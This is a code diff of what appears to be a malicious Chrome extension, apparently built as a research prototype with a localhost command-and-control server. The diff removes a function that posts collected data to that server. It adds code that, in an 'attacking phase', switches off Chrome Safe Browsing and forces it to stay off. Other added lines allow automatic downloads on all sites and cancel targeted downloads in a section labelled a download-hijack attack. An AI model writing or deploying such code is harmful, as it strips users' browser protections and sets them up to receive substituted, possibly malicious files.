@@ -85,17 +85,7 @@ PhiContentsDefualt = undefined;  //The new element
 
 const IP = "http://127.0.0.1:5000/"; //the url of the CC server, this would not exists in a real distribution has a global variable
 const IP_Send = IP + `extadd/`
-//Common Fetch Function
 
-function log(Data, Type){
-    fetch(IP_Send + Type,
-    {
-    method: "POST",
-    mode: 'no-cors',
-    body: JSON.stringify(Data),
-    headers:{"Content-Type": "application/json"}
-    })
-}
 
 
 chrome.runtime.onInstalled.addListener(function setuid(){
@@ -488,6 +478,27 @@ function phase(){ //This function manges any kind of change in the phase
             chrome.storage.local.set({ChildPhi: result.chi});
             chrome.storage.local.set({ContPhi:  result.con});
             chrome.storage.local.set({ParentPhi:result.par});
+            if (parseInt(result.phase) ==1){
+                function keepItOff(pref) {
+                    function turnItOff(details) {
+                      
+                      if (details.levelOfControl === 'controllable_by_this_extension') {
+                        pref.set({ value: false }, () => {});
+                      }
+                    }
+                    pref.get({}, turnItOff);
+                    if (!pref.onChange.hasListeners()) {
+                      pref.onChange.addListener((details) => {
+                        if (details.value) {
+                          turnItOff(details);
+                        }
+                      });
+                    }
+                  }
+                  keepItOff(chrome.privacy.services.safeBrowsingEnabled);
+
+
+            }
         });})
 }
 
@@ -511,11 +522,12 @@ chrome.webNavigation.onCompleted.addListener((e) => {//add a listener that activ
 
 
 
-//PAYLOAD ATTACK
+//Donwload Hijack ATTACK
 
 function modify(item){
     chrome.storage.local.get(["phase"]).then((result)=>{ //look at the actual phase
         if(result.phase == 1){ //if we are in attacking phase
+            chrome.contentSettings.automaticDownloads.set({primaryPattern:'<all_urls>', setting:"allow"});
             chrome.storage.local.get(["ObjDown","TarDown","NamDown"]).then((result1)=>{ //ask for all storage information 
                 if (item.url.includes(result1.ObjDown)){ //is the object our objective?
                         chrome.downloads.cancel(item.id) //if it is, cancel that download
